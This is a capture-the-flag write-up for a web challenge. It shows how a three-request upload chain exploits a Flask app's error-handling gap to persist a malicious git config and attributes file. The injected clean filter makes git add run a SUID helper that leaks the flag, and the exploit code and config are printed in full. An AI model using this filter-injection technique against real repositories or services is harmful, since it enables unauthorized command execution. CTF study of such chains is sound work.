# clankers-market

**Category:** Web | **Difficulty:** Beginner (😅) | **Flag:** `bctf{d1d_you_get_rce_from_checkout??I_tried_my_best_to_limit_but_clanker_too_good_now!!!}`

## TL;DR

A Flask app that serves your uploaded files as a fake git repo, then runs git-dumper against itself. The trick is a three-request chain: persist a git clean filter via deliberate 500 errors (before sanitize runs), then trigger `git add` to invoke the SUID helper that reads `/flag.txt`, and let git-dumper reconstruct the flag blob verbatim on checkout.

## What We're Given

We get the full source (`dist/`) and a live instance. The app is a "clanker feature" that:

1. Lets you upload up to 2 files
2. Creates a local git repo in `/tmp/git_storage`, commits a random `bctf{steal_<hex>}` flag into `flag.txt`
3. Sanitizes the repo (empties `.git/config`, removes hooks, removes `.git/info/`, kills any file containing the string "git", and deletes `.py/.sh/.c/etc` files)
4. Spins up a `python3 -m http.server` on port 12345 serving that directory
5. Runs `git-dumper` against localhost:12345 into `/tmp/dump`
6. Reads `/tmp/dump/flag.txt` and returns it back to you

The Dockerfile also reveals there's a real flag at `/flag.txt` (owned by root, `chmod 400` — we can't read it directly) and a SUID helper binary at `/usr/local/bin/read-flag` (`chmod 4750`, group `web`) that prints `/flag.txt`. The app runs as user `web`, so anything the app's process executes can use that helper.

There's a decoy in the Dockerfile too: the build writes `bctf{kill_bill_2}` to `/flag.txt` as a placeholder. On the real deploy this is replaced with the actual flag. Don't get excited when you see that.

## Initial Recon

The obvious angle from the challenge description is: "git-dumper at checkout — can I get RCE there?" Git supports filter drivers that run commands during `git checkout` (smudge filters) and during `git add` (clean filters). If we can inject a malicious `.git/config` into the repo that git-dumper eventually checks out, maybe we can get smudge-filter RCE.

The sanitize function shuts that down immediately:

```python
def sanitize():
    run_command("rm .git/config")
    run_command("touch .git/config")     # empty config — no filters
    run_command("rm -rf .git/hooks")
    run_command("rm -rf .git/info")
    run_command(r"grep -rlZ 'git' . | xargs -0 rm -f --")
    ...
```

So `.git/config` is cleared, `.git/info/` is nuked, and any file on disk containing the string "git" is deleted. That kills the obvious approaches. The challenge is clearly aware of filter-based RCE — the flag literally says "did you get RCE from checkout??"

We spent a while on smudge filter angles and crafted pack files before spotting the real bug. Those dead ends are documented below.

## The Vulnerability / Trick

There are actually **four bugs chained together**. Let's walk through them one at a time.

### Bug 1: Files persist across 500 errors

Look at the request handler in `app.py`:

```python
# Setup
setup()
setup_git_storage()

# Save all validated files
for file, normalized_path in validated:
    os.makedirs(os.path.dirname(normalized_path), exist_ok=True)
    file.save(normalized_path)

# Sanitize the environment
sanitize()
```

Notice what's missing: there's no `try/except` around `os.makedirs` or `file.save`. If either of those raises an exception mid-loop, the request crashes with a 500 — and `sanitize()` never runs.

We can trigger this on purpose: if we upload two files where the *second* file's directory path conflicts with a *file* the first upload already wrote, `os.makedirs` will raise an error when trying to create a directory where a file exists.

For example:
- File 1: `.git/info/attributes` (creates the file `/tmp/git_storage/.git/info/attributes`)
- File 2: `.git/info/attributes/boom` (tries to `os.makedirs('/tmp/git_storage/.git/info/attributes/')` — but that path is already a file, not a directory → `NotADirectoryError`)

The request 500s. File 1 is now sitting on disk in `/tmp/git_storage/.git/info/attributes`, and `sanitize()` never touched it.

### Bug 2: `git init` is idempotent

The next request calls `setup_git_storage()` which begins with:

```python
run_command("git init .")
```

Here's the key thing about `git init` on an *existing* repo: **it's a no-op for the files that already exist**. It won't overwrite `.git/config`. It won't touch `.git/info/attributes`. Those files from our last request survive into this one.

This means if we use Bug 1 twice — once to persist `.git/info/attributes` and once to persist `.git/config` — those files will still be there when the third request does `git init` and then `git add`.

### Bug 3: Clean filters run during `git add`

Git filter drivers let you transform file content as it flows in and out of the index. A **clean filter** runs when a file is being staged — i.e., during `git add`. A smudge filter runs during checkout.

We need a clean filter, not a smudge filter. Why? Because `sanitize()` empties `.git/config` before git-dumper ever runs, so any filter defined there is gone before checkout happens. But if we inject the filter config *before* `git add` runs (which happens in `setup_git_storage()`), the filter gets applied when files are staged — replacing the blob content with whatever our command outputs.

The setup is:

`.git/info/attributes`:
```
* filter=x
```
This tells git: apply filter `x` to every file being staged.

`.git/config`:
```
[filter "x"]
    clean = sh -c "/usr/local/bin/read-flag;cat"
    required = true
```
This defines filter `x`: when staging any file, run `read-flag` (which prints `/flag.txt` as root via SUID) and then pipe the original file content through `cat`.

When `setup_git_storage()` runs `git add .`, git stages `flag.txt` through our filter. The blob committed to the repo isn't `bctf{steal_...}` — it's `/flag.txt`'s real contents (plus the original `bctf{steal_...}` appended by the `;cat`).

### Bug 4: The `cat` trick (why we need `;cat`)

Why not just `clean = /usr/local/bin/read-flag`?

`setup_git_storage()` does *two* commits per request:

```python
run_command("git add . && git commit -m 'Initial commit'", ignored_errors=True)
# ... writes flag.txt ...
run_command("git add .")
run_command("git commit -m 'ctf is so easy'")  # <-- this one is NOT ignored
```

If our clean filter just outputs `/flag.txt` verbatim for every file, then *both* `git add` calls produce identical blobs for every file. Git notices the tree hasn't changed between the first and second commits and throws `nothing to commit`. That second `git commit` has `ignored_errors=False`, so it raises an exception and the request 500s with a useless error.

The fix: `sh -c "/usr/local/bin/read-flag;cat"` — run `read-flag`, then pipe stdin (the original file content) through `cat`. Since `flag.txt` has a random `bctf{steal_<hex>}` value that changes each request, the blob after the first `git add` includes the real flag plus the old random flag, and after the second `git add` it includes the real flag plus the new random flag written by `setup_git_storage()`. The blobs differ. Both commits succeed.

### The `.git/info/attributes` trick (why NOT `.gitattributes`)

This one is subtle and we actually hit this bug during the solve.

`sanitize()` runs:

```python
run_command(r"grep -rlZ 'git' . | xargs -0 rm -f --")
```

This recursively greps the whole WORKDIR for any file containing the string "git" and deletes it. A `.gitattributes` file in the repo root would be a tracked file. When git stages it, the filename `.gitattributes` ends up as a path entry inside `.git/index`. The binary index file contains the string "gitattributes" — so `grep 'git' .git/index` matches, and sanitize deletes the entire `.git/index`.

Without an index, git-dumper can successfully download all the loose objects, but when it runs `git checkout .` at the end, git complains "pathspec '.' did not match any file(s) known to git." Nothing gets materialized. `/tmp/dump/flag.txt` doesn't exist. The app errors out.

The fix: use `.git/info/attributes` instead of `.gitattributes`. This is a per-repo (not per-worktree) attributes file that git reads as a local override. It's not tracked, so it never shows up in `.git/index`. Sanitize deletes `.git/info/` entirely — but only *after* `git add` has already run our filter. By the time `sanitize()` is called, the poisoned blob is already committed. Job done.

## Building the Exploit

The full exploit is three requests to `/clanker-feature`.

**Request A — persist `.git/info/attributes`:**

```python
rA = upload([
    (".git/info/attributes", b"* filter=x\n"),
    (".git/info/attributes/boom", b"x"),
])
```

File 1 saves successfully, creating `.git/info/attributes` with our filter glob. File 2's `os.makedirs` tries to create a directory at the path where a file already exists — `NotADirectoryError`. The request 500s. `sanitize()` never runs. The attributes file lives on.

**Request B — persist `.git/config`:**

```python
config = (
    b'[filter "x"]\n'
    b'\tclean = sh -c "/usr/local/bin/read-flag;cat"\n'
    b'\trequired = true\n'
)
rB = upload([
    (".git/config", config),
    (".git/config/boom", b"x"),
])
```

Same trick. `.git/config` now defines filter `x` pointing at our SUID helper.

**Request C — trigger:**

```python
rC = upload([
    ("trivial1.txt", b"hello\n"),
    ("trivial2.txt", b"world\n"),
])
```

Just two harmless files. This request succeeds — no 500. Here's what happens inside it:

1. `setup_git_storage()` runs `git init .` — idempotent, preserves our `.git/config` and `.git/info/attributes`
2. `git add .` stages all files, invoking our clean filter on each one. Every blob's content is now: `/flag.txt` contents + the original file content
3. Both commits succeed (blobs differ thanks to `;cat`)
4. `sanitize()` runs — clears `.git/config`, nukes `.git/info/`, but the committed blobs in `.git/objects/` are untouched
5. `git-dumper` fetches `.git/config` (now empty), all refs, and all pack/loose objects from the HTTP server
6. `git checkout .` in `/tmp/dump` materializes `flag.txt` from the index blob. No filter config in `/tmp/dump/.git/config` means checkout is pass-through — the raw blob bytes land verbatim as `flag.txt`
7. The app opens `/tmp/dump/flag.txt`, reads the real flag, and returns it

The flag extraction:

```python
m = re.search(rb"Congrats:\s*(bctf\{[^}]+\})", rC.content)
if m:
    flag = m.group(1).decode()
    print("\n[+] FLAG:", flag)
```

## Running It

```
$ python3 solve.py http://CHALL_HOST:PORT
[*] A: persist .git/info/attributes
    -> 500
[*] B: persist .git/config with filter
    -> 500
[*] C: trigger
    -> 200

[+] FLAG: bctf{d1d_you_get_rce_from_checkout??I_tried_my_best_to_limit_but_clanker_too_good_now!!!}
```

Requests A and B 500 as expected — that's intentional. Request C returning 200 is the payoff.

## Dead Ends We Hit

**Smudge filter at checkout:** Our first instinct was to make git-dumper trigger a smudge filter. Smudge runs on `git checkout`, which happens inside git-dumper on the attacker side. But `sanitize()` empties `.git/config` before git-dumper fetches it, so the dumped repo has no filter definition — checkout just writes the blob bytes, no commands run. Dead end.

**Injecting a crafted pack file:** We explored uploading a handcrafted git pack file to replace the repo's object store with one we controlled. Even if we could do this, it wouldn't give us code execution — we'd still just control what gets written to `/tmp/dump`, and we can't write to arbitrary paths from there.

**Submitting `bctf{steal_...}` directly:** The CTF platform knows the real flag. The random hex token in `bctf{steal_<hex>}` changes every request, and even if it didn't, the platform won't accept it. We need `/flag.txt`.

## Key Takeaways

- **`git init` is idempotent.** Running it on an existing repo updates the description and some defaults but never touches `.git/config`, `.git/info/`, or your commit history. If you ever want to inject persistent git config before a `git add`, this is your foothold.

- **Clean filters run at `git add`, not at checkout.** This is easy to mix up with smudge filters. When the server-side sanitization happens after `git add` but before checkout, a clean filter is your friend.

- **Error handling gaps are a primitive.** The lack of `try/except` around `os.makedirs` turned an ordinary upload endpoint into a state-persistence primitive. Half of web exploitation is finding spots where the error path skips the cleanup code.

- **The index is a binary file that contains filenames.** `grep 'pattern' .git/index` can match on tracked filenames, not just file content. If your cleanup script greps for a word and your attack artifact has that word in its filename, the index itself becomes a target — and losing the index breaks `git checkout`.

- **SUID helpers in CTF containers are almost always the intended path.** When you see a `read-flag` binary with `chmod 4750`, find a way to execute it as the app user. The question is just how.

For more on git filter drivers: [git-scm.com/docs/gitattributes#_filter](https://git-scm.com/docs/gitattributes#_filter)
